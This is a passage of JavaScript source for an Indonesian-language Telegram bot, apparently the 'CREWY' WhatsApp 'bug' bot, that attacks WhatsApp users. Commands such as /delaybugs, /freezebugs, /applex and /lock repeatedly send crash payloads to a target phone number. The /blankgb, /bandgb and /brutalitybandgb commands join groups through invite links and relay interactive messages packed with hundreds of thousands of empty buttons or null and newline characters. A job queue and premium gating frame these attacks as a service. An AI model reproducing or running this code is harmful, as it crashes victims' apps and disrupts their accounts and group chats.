${E.warn()} Script ini tidak work di semua nomor karena menggunakan function ringan untuk sender.
${E.info()} Jika ingin work di semua nomor, gunakan script CREWY NO SPAM.

${E.crown()} Developer : @MedyKillyou
${E.diamond()} Creator Sec : @durovyatem
`;
    await safeEditMessageCaption(ctx, text, {
      parse_mode: 'HTML',
      reply_markup: buildBackKeyboard()
    });
    autoColorMessages.delete(ctx.chat.id);
    await ctx.answerCbQuery().catch(() => {});
  } catch (err) {
    console.error('ERROR action_winner:', err);
    await ctx.answerCbQuery('Gagal memuat menu').catch(() => {});
  }
});

bot.action('action_tools', async (ctx) => {
  try {
    const text = `
${Q(`${CREWY_FONT}\n${E.gear()} 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔 𝑴𝒆𝒏𝒖`)}
${T.ready}

${Q(`${CREWY_FONT}\n${E.key()} 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔 𝑺𝒆𝒏𝒅𝒆𝒓`)}
${E.phone()} /addsender → tambah akses
${E.clock()} /resetsession → reset sesi
${E.check()} /ceksender → cek koneksi sender

${Q(`${CREWY_FONT}\n${E.cat()} 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔 𝑪𝒉𝒂𝒏𝒏𝒆𝒍`)}
${E.bell()} /setch → tambah 1 ch
${E.bell2()} /set2ch → tambah 2 ch
${E.horn()} /setchXgroup → 2 ch + 1 grup
${E.cross()} /resetch → resetch

${Q(`${CREWY_FONT}\n${E.dora()} 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔 𝑴𝒖𝒓𝒃𝒖𝒈`)}
${E.gift()} /addpremgrup → add prem gc
${E.trash()} /delpremgrup → hapus prem
${E.info()} /cekpremgrup → cek status gc
${E.rank()} /cekantrian → lihat antrian
${E.cross()} /clearantrian → hapus antre
${E.lock()} /blockcmd → block cmd
${E.unlock()} /unblockcmd → buka block
${E.scroll()} /listblocked → list block
${E.clock()} /setcd → set cooldown

${Q(`${CREWY_FONT}\n${E.crown()} 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔 𝑨𝒅𝒎𝒊𝒏`)}
${E.medal()} /addadmin → tambah admin
${E.cross()} /deladmin → hapus admin
${E.rank()} /listadmin → list admin

${Q(`${CREWY_FONT}\n${E.bell()} 𝑺𝒆𝒕𝒕𝒊𝒏𝒈𝒔 𝑼𝒔𝒆𝒓`)}
${E.gift()} /addprem → add premium
${E.trash()} /delprem → hapus prem
${E.rank()} /listprem → list prem
${E.check()} /cekprem → cek status
`;
    await safeEditMessageCaption(ctx, text, {
      parse_mode: 'HTML',
      reply_markup: buildBackKeyboard()
    });
    autoColorMessages.delete(ctx.chat.id);
    await ctx.answerCbQuery().catch(() => {});
  } catch (err) {
    console.error('ERROR action_tools:', err);
    await ctx.answerCbQuery('Gagal memuat menu').catch(() => {});
  }
});

// ─── Missing handler: back to start ───
bot.action('start_menu', async (ctx) => {
  try {
    const user = ctx.from;
    const userId = user.id;
    const username = user.username ? `@${user.username}` : 'Tidak ada';
    const senderStatus = isWhatsAppConnected ? T.waConnected : T.waDisconn;
    const RandomBgtJir = "https://ganga--link--ghhzdp9sv8hk.code.run/i/e80ffqtd";

    const sentMessage = await ctx.replyWithPhoto(RandomBgtJir, {
      caption: buildStartCaption(userId, username, senderStatus),
      parse_mode: 'HTML',
      reply_markup: buildStartKeyboard()
    });

    autoColorMessages.set(ctx.chat.id, sentMessage.message_id);
    await ctx.answerCbQuery().catch(() => {});
  } catch (err) {
    console.error('ERROR start_menu:', err);
    await ctx.answerCbQuery('Gagal').catch(() => {});
  }
});

let currentProcessingTarget = null;
let antrianDetail = [];

let antrianBug = [];
let sedangMemproses = null;
let jumlahProsesSekarang = 0;
const MAKS_PROCES_SERENTAK = 3;

function tambahAntrian(target, label, fungsiBug) {
    const posisi = antrianBug.length + 1;
    antrianBug.push({
        target: target,
        label: label,
        fungsi: fungsiBug,
        status: 'antri'
    });
    setTimeout(() => prosesAntrian(), 0);
    return posisi;
}

async function prosesAntrian() {
    if (jumlahProsesSekarang >= MAKS_PROCES_SERENTAK) return;
    if (antrianBug.length === 0) return;

    const job = antrianBug.shift();
    sedangMemproses = job.target;
    jumlahProsesSekarang++;

    (async () => {
        try {
            console.log(`🔨 MULAI BUG: ${job.label} ke ${job.target}`);
            await job.fungsi();
            console.log(`✅ SELESAI BUG: ${job.label} ke ${job.target}`);
        } catch (err) {
            console.log(`❌ GAGAL BUG: ${job.label} ke ${job.target} - ${err.message}`);
        } finally {
            jumlahProsesSekarang--;
            sedangMemproses = (antrianBug.length > 0) ? antrianBug[0].target : null;
            prosesAntrian();
        }
    })();

    prosesAntrian();
}

bot.command('clearantrian', checkOwner, async (ctx) => {
    const jumlah = antrianBug.length;
    antrianBug = [];
    sedangMemproses = null;
    jumlahProsesSekarang = 0;
    ctx.reply(`${E.ok()} Antrian berhasil dihapus! Total ${jumlah} job dibatalkan ${E.bell()}`, { parse_mode: 'HTML' });
});

bot.command('cekantrian', checkPremium, async (ctx) => {
    const sedangProses = sedangMemproses || 'Tidak ada';
    const jumlahAntrian = antrianBug.length;
    const maksBareng = MAKS_PROCES_SERENTAK;
    const prosesAktif = jumlahProsesSekarang;

    const estimasiDetik = (jumlahAntrian / maksBareng) * 10;
    let estimasiText = '';
    if (estimasiDetik < 60) {
        estimasiText = `~ ${Math.ceil(estimasiDetik)} detik`;
    } else if (estimasiDetik < 3600) {
        estimasiText = `~ ${Math.ceil(estimasiDetik / 60)} menit`;
    } else {
        estimasiText = `~ ${Math.ceil(estimasiDetik / 3600)} jam`;
    }

    let daftarAntrian = '';
    if (jumlahAntrian > 0) {
        const maxTampil = Math.min(5, jumlahAntrian);
        for (let i = 0; i < maxTampil; i++) {
            const job = antrianBug[i];
            daftarAntrian += `${i+1}. ${job.target} (${job.label})\n`;
        }
        if (jumlahAntrian > 5) {
            daftarAntrian += `... dan ${jumlahAntrian - 5} antrian lainnya.`;
        }
    } else {
        daftarAntrian = '(kosong)';
    }

    let teks = `${Q(`${CREWY_FONT}\n${E.rank()} 𝑪𝒆𝒌 𝑨𝒏𝒕𝒓𝒊𝒂𝒏 𝑩𝒖𝒈`)}\n\n`;
    teks += `${E.fire()} Sedang diproses: ${sedangProses}\n`;
    teks += `${E.zap()} Proses bersamaan: ${prosesAktif} dari ${maksBareng}\n`;
    teks += `${E.gift()} Antrian menunggu: ${jumlahAntrian} nomor\n`;
    teks += `${E.hourglass()} Estimasi selesai: ${estimasiText}\n\n`;
    teks += `${E.scroll()} 5 Antrian terdepan:\n${daftarAntrian}\n\n`;
    ctx.reply(teks, { parse_mode: 'HTML' });
});

async function backgroundRun(ctx, targetNumber, jobAsyncFn, label = 'job') {
    try {
        const posisi = tambahAntrian(targetNumber, label, jobAsyncFn);
        await safeTelegramAction(() =>
            ctx.reply(`${E.ok()} ${label} selesai untuk ${targetNumber} ${E.dora()}`, { parse_mode: 'HTML' })
        );
        console.log(`📝 Job ${label} ke ${targetNumber} antrian posisi ${posisi}`);
    } catch (err) {
        console.error("backgroundRun error:", err);
        await safeTelegramAction(() => ctx.reply(T.fail, { parse_mode: 'HTML' }));
    }
}

const BUG_IMAGE_URL = "https://ganga--link--ghhzdp9sv8hk.code.run/i/e80ffqtd";

function buildProgressBar(percent) {
  const total = 10;
  const filled = Math.floor((percent / 100) * total);
  const empty = total - filled;
  return "█".repeat(filled) + "░".repeat(empty);
}

function buildBugCaption(label, targetRaw, percent, status) {
  const bar = buildProgressBar(percent);
  return (
    `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒖𝒈𝒔 𝑷𝒓𝒐𝒈𝒓𝒆𝒔𝒔`)}\n` +
    `${E.target()} Command : ${label}\n` +
    `${E.phone()} Target  : ${targetRaw}\n` +
    `${E.rank()} Progress: [${bar}] ${percent}%\n` +
    `${E.info()} Status  : <b>${status}</b>\n`
  );
}

function buildBugKeyboard(targetRaw) {
  return {
    inline_keyboard: [[
      { text: "Target WA", url: "https://wa.me/" + targetRaw, icon_custom_emoji_id: EMOJI_IDS.phone, style: nextStyle() }
    ]]
  };
}

async function editBugProgress(ctx, chatId, messageId, label, targetRaw, percent, status) {
  try {
    await ctx.telegram.editMessageCaption(chatId, messageId, undefined,
      buildBugCaption(label, targetRaw, percent, status),
      { parse_mode: "HTML", reply_markup: buildBugKeyboard(targetRaw) }
    );
  } catch (e) {
    if (!e.description?.includes("message is not modified")) {
      console.error("editBugProgress:", e.message);
    }
  }
}

async function runBugWithBar(ctx, label, targetRaw, totalLoop, attackFn, delayMs = 2000) {
  const targetJid = targetRaw.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sent = await ctx.telegram.sendPhoto(ctx.chat.id, BUG_IMAGE_URL, {
    caption: buildBugCaption(label, targetRaw, 0, `${E.clock()} Process`),
    parse_mode: "HTML",
    reply_markup: buildBugKeyboard(targetRaw)
  });

  const messageId = sent.message_id;
  const percentStep = 100 / totalLoop;

  for (let i = 0; i < totalLoop; i++) {
    try {
      await safeSend(() => attackFn(sock, targetJid));
    } catch (err) {
      console.log(chalk.red(`❌ ${label} loop ${i + 1}: ${err.message}`));
    }
    await sleep(delayMs);

    if ((i + 1) % Math.max(1, Math.floor(totalLoop / 10)) === 0 || i + 1 === totalLoop) {
      const percent = Math.min(100, Math.floor((i + 1) * percentStep));
      await editBugProgress(ctx, ctx.chat.id, messageId, label, targetRaw, percent, `${E.clock()} Process`);
    }
  }

  await editBugProgress(ctx, ctx.chat.id, messageId, label, targetRaw, 100, `${E.success()} Success`);
  return messageId;
}

bot.command("delaybugs", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/delaybugs 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "delaybugs", targetRaw, 10, XtravsHardDelay, 2000);
});

bot.command("androidDelay", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/androidDelay 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "androidDelay", targetRaw, 10, XtravsHardDelay, 2000);
});

bot.command("freezebugs", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/freezebugs 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "freezebugs", targetRaw, 10, forceclosemsg, 2000);
});

bot.command("freezeall", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/freezeall 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "freezeall", targetRaw, 10, forceclosemsg, 2000);
});

bot.command("applex", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/applex 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "applex", targetRaw, 10, BigIosSuport, 1000);
});

bot.command("invisios", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/invisios 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "invisios", targetRaw, 10, BigIosSuport, 1000);
});

bot.command("iosdelay", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/iosdelay 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "iosdelay", targetRaw, 50, XtravsHardDelay, 2000);
});

bot.command("iosinvisible", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/iosinvisible 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "iosinvisible", targetRaw, 50, XtravsHardDelay, 2000);
});

bot.command("lock", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/lock 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "lock", targetRaw, 10, async (s, t) => {
    await XmagicMachine(s, t);
    await locktasz(s, t);
  }, 2000);
});

bot.command("abox", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/abox 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "abox", targetRaw, 10, async (s, t) => {
    await XmagicMachine(s, t);
    await locktasz(s, t);
  }, 2000);
});

bot.command("delayXfreeze", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/delayXfreeze 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "delayXfreeze", targetRaw, 10, crashV5, 2000);
});

bot.command("hardinvis", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/hardinvis 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "hardinvis", targetRaw, 10, crashV5, 2000);
});

bot.command("locktasz", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/locktasz 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "locktasz", targetRaw, 10, crashV2, 2000);
});

bot.command("buffer", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/buffer 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "buffer", targetRaw, 10, crashV2, 2000);
});

bot.command("sen", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/sen 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "sen", targetRaw, 50, async (s, t) => {
    await XmagicMachine(s, t);
    await locktasz(s, t);
  }, 1500);
});

bot.command("test", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const arg = ctx.message.text.split(/\s+/)[1];
  if (!arg) return ctx.reply(`${E.fail()} Format: <code>/test 628xxxxxxxx</code>`, { parse_mode: 'HTML' });
  const targetRaw = arg.replace(/[^0-9]/g, "");
  await runBugWithBar(ctx, "test", targetRaw, 50, async (s, t) => {
    await XmagicMachine(s, t);
    await locktasz(s, t);
  }, 1500);
});

function extractGroupLink(text) {
  const m = text.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
  return m ? m[1] : null;
}

async function sendBlankToGroup(sock, groupJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "X" },
          nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
        }
      }
    }
  };
  await safeSend(() => sock.relayMessage(groupJid, msg, { participant: true }));
}

async function sendBlankToGroupV2(sock, groupJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: { title: "CREWY IS BACK" },
          body: { text: "\0" },
          nativeFlowMessage: { buttons: "\0".repeat(500000) }
        }
      }
    }
  };
  await safeSend(() => sock.relayMessage(groupJid, msg, { noSelfSync: true }));
}

async function sendBlankToGroupV3(sock, groupJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "X" },
          nativeFlowMessage: { buttons: "\n".repeat(300000) }
        }
      }
    }
  };
  await safeSend(() => sock.relayMessage(groupJid, msg, { participant: true }));
}

async function sendBlankToGroupV4(groupJid) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "X" },
          nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
        }
      }
    }
  };
  await safeSend(() => sock.relayMessage(groupJid, msg, { participant: true }));
}

bot.command("blankgb", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply(`${E.fail()} Format: <code>/blankgb https://chat.whatsapp.com/xxxxxx</code>`, { parse_mode: 'HTML' });
  const inviteCode = extractGroupLink(target);
  if (!inviteCode) return ctx.reply(`${E.fail()} Link tidak valid!`, { parse_mode: 'HTML' });

  const statusMsg = await ctx.replyWithPhoto(BUG_IMAGE_URL, {
    caption: `${Q(`${CREWY_FONT}\n${E.cat()} 𝑩𝒍𝒂𝒏𝒌 𝑮𝒓𝒐𝒖𝒑`)}\n${E.target()} Target: ${inviteCode}\n${E.info()} Status: ${E.clock()} Join grup...`,
    parse_mode: "HTML"
  });

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode);
    if (!groupJid) throw new Error("Gagal join grup");
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "blankgb", inviteCode, 50, `${E.clock()} Sending bug...`);
    await sendBlankToGroupV4(groupJid);
    await sleep(1500);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "blankgb", inviteCode, 100, `${E.success()} Success`);
  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, statusMsg.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.cat()} 𝑩𝒍𝒂𝒏𝒌 𝑮𝒓𝒐𝒖𝒑`)}\n${E.target()} Target: ${inviteCode}\n${E.fail()} Status: Gagal: ${err.message}`,
      { parse_mode: "HTML" });
  }
});

bot.command("bandgb", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply(`${E.fail()} Format: <code>/bandgb https://chat.whatsapp.com/xxxxxx</code>`, { parse_mode: 'HTML' });
  const inviteCode = extractGroupLink(target);
  if (!inviteCode) return ctx.reply(`${E.fail()} Link tidak valid!`, { parse_mode: 'HTML' });

  const statusMsg = await ctx.replyWithPhoto(BUG_IMAGE_URL, {
    caption: `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.info()} Status: ${E.clock()} Join grup...`,
    parse_mode: "HTML"
  });

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode);
    if (!groupJid) throw new Error("Gagal join grup");
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bandgb", inviteCode, 50, `${E.clock()} Sending bug...`);
    await sendBlankToGroup(sock, groupJid);
    await sendBlankToGroupV2(sock, groupJid);
    await sleep(1500);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bandgb", inviteCode, 100, `${E.success()} Success`);
  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, statusMsg.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.fail()} Status: Gagal: ${err.message}`,
      { parse_mode: "HTML" });
  }
});

bot.command("bandgbV1", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply(`${E.fail()} Format: <code>/bandgbV1 https://chat.whatsapp.com/xxxxxx</code>`, { parse_mode: 'HTML' });
  const inviteCode = extractGroupLink(target);
  if (!inviteCode) return ctx.reply(`${E.fail()} Link tidak valid!`, { parse_mode: 'HTML' });

  const statusMsg = await ctx.replyWithPhoto(BUG_IMAGE_URL, {
    caption: `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.info()} Status: ${E.clock()} Join grup...`,
    parse_mode: "HTML"
  });

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode);
    if (!groupJid) throw new Error("Gagal join grup");
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bandgbV1", inviteCode, 50, `${E.clock()} Sending bug...`);
    await sendBlankToGroup(sock, groupJid);
    await sendBlankToGroupV2(sock, groupJid);
    await sleep(1500);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bandgbV1", inviteCode, 100, `${E.success()} Success`);
  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, statusMsg.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.fail()} Status: Gagal: ${err.message}`,
      { parse_mode: "HTML" });
  }
});

bot.command("bannedgroup", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply(`${E.fail()} Format: <code>/bannedgroup https://chat.whatsapp.com/xxxxxx</code>`, { parse_mode: 'HTML' });
  const inviteCode = extractGroupLink(target);
  if (!inviteCode) return ctx.reply(`${E.fail()} Link tidak valid!`, { parse_mode: 'HTML' });

  const statusMsg = await ctx.replyWithPhoto(BUG_IMAGE_URL, {
    caption: `${Q(`${CREWY_FONT}\n${E.boom()} 𝑩𝒂𝒏𝒏𝒆𝒅 𝑮𝒓𝒐𝒖𝒑`)}\n${E.target()} Target: ${inviteCode}\n${E.info()} Status: ${E.clock()} Join grup...`,
    parse_mode: "HTML"
  });

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode);
    if (!groupJid) throw new Error("Gagal join grup");
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bannedgroup", inviteCode, 50, `${E.clock()} Sending bug...`);
    await sendBlankToGroup(sock, groupJid);
    await sendBlankToGroupV2(sock, groupJid);
    await sleep(1500);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bannedgroup", inviteCode, 100, `${E.success()} Success`);
  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, statusMsg.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.boom()} 𝑩𝒂𝒏𝒏𝒆𝒅 𝑮𝒓𝒐𝒖𝒑`)}\n${E.target()} Target: ${inviteCode}\n${E.fail()} Status: Gagal: ${err.message}`,
      { parse_mode: "HTML" });
  }
});

bot.command("bannedgroupV1", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply(`${E.fail()} Format: <code>/bannedgroupV1 https://chat.whatsapp.com/xxxxxx</code>`, { parse_mode: 'HTML' });
  const inviteCode = extractGroupLink(target);
  if (!inviteCode) return ctx.reply(`${E.fail()} Link tidak valid!`, { parse_mode: 'HTML' });

  const statusMsg = await ctx.replyWithPhoto(BUG_IMAGE_URL, {
    caption: `${Q(`${CREWY_FONT}\n${E.boom()} 𝑩𝒂𝒏𝒏𝒆𝒅 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.info()} Status: ${E.clock()} Join grup...`,
    parse_mode: "HTML"
  });

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode);
    if (!groupJid) throw new Error("Gagal join grup");
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bannedgroupV1", inviteCode, 50, `${E.clock()} Sending bug...`);
    await sendBlankToGroup(sock, groupJid);
    await sendBlankToGroupV2(sock, groupJid);
    await sleep(1500);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "bannedgroupV1", inviteCode, 100, `${E.success()} Success`);
  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, statusMsg.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.boom()} 𝑩𝒂𝒏𝒏𝒆𝒅 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.fail()} Status: Gagal: ${err.message}`,
      { parse_mode: "HTML" });
  }
});

bot.command("brutalitybandgb", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply(`${E.fail()} Format: <code>/brutalitybandgb https://chat.whatsapp.com/xxxxxx</code>`, { parse_mode: 'HTML' });
  const inviteCode = extractGroupLink(target);
  if (!inviteCode) return ctx.reply(`${E.fail()} Link tidak valid!`, { parse_mode: 'HTML' });

  const statusMsg = await ctx.replyWithPhoto(BUG_IMAGE_URL, {
    caption: `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒓𝒖𝒕𝒂𝒍𝒊𝒕𝒚 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑`)}\n${E.target()} Target: ${inviteCode}\n${E.info()} Status: ${E.clock()} Join grup...`,
    parse_mode: "HTML"
  });

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode);
    if (!groupJid) throw new Error("Gagal join grup");
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgb", inviteCode, 30, `${E.clock()} Bug 1/3...`);
    await sendBlankToGroup(sock, groupJid);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgb", inviteCode, 60, `${E.clock()} Bug 2/3...`);
    await sendBlankToGroupV2(sock, groupJid);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgb", inviteCode, 90, `${E.clock()} Bug 3/3...`);
    await sendBlankToGroupV3(sock, groupJid);
    await sleep(1500);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgb", inviteCode, 100, `${E.success()} Success`);
  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, statusMsg.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒓𝒖𝒕𝒂𝒍𝒊𝒕𝒚 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑`)}\n${E.target()} Target: ${inviteCode}\n${E.fail()} Status: Gagal: ${err.message}`,
      { parse_mode: "HTML" });
  }
});

bot.command("brutalitybandgbV1", checkPremium, checkWhatsAppConnection, async (ctx) => {
  const target = ctx.message.text.split(" ")[1];
  if (!target) return ctx.reply(`${E.fail()} Format: <code>/brutalitybandgbV1 https://chat.whatsapp.com/xxxxxx</code>`, { parse_mode: 'HTML' });
  const inviteCode = extractGroupLink(target);
  if (!inviteCode) return ctx.reply(`${E.fail()} Link tidak valid!`, { parse_mode: 'HTML' });

  const statusMsg = await ctx.replyWithPhoto(BUG_IMAGE_URL, {
    caption: `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒓𝒖𝒕𝒂𝒍𝒊𝒕𝒚 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.info()} Status: ${E.clock()} Join grup...`,
    parse_mode: "HTML"
  });

  try {
    const groupJid = await sock.groupAcceptInvite(inviteCode);
    if (!groupJid) throw new Error("Gagal join grup");
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgbV1", inviteCode, 30, `${E.clock()} Bug 1/3...`);
    await sendBlankToGroup(sock, groupJid);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgbV1", inviteCode, 60, `${E.clock()} Bug 2/3...`);
    await sendBlankToGroupV2(sock, groupJid);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgbV1", inviteCode, 90, `${E.clock()} Bug 3/3...`);
    await sendBlankToGroupV3(sock, groupJid);
    await sleep(1500);
    await editBugProgress(ctx, ctx.chat.id, statusMsg.message_id, "brutalitybandgbV1", inviteCode, 100, `${E.success()} Success`);
  } catch (err) {
    await ctx.telegram.editMessageCaption(ctx.chat.id, statusMsg.message_id, undefined,
      `${Q(`${CREWY_FONT}\n${E.bomb()} 𝑩𝒓𝒖𝒕𝒂𝒍𝒊𝒕𝒚 𝑩𝒂𝒏 𝑮𝒓𝒐𝒖𝒑 𝑽1`)}\n${E.target()} Target: ${inviteCode}\n${E.fail()} Status: Gagal: ${err.message}`,
      { parse_mode: "HTML" });
  }
});

bot.command('delprem', checkOwner, async (ctx) => {
  const args = ctx.message.text.split(' ').filter(Boolean);
  const chatType = ctx.chat.type;

  if ((chatType === 'group' || chatType === 'supergroup') && args.length === 1) {
    const chatId = ctx.chat.id.toString();
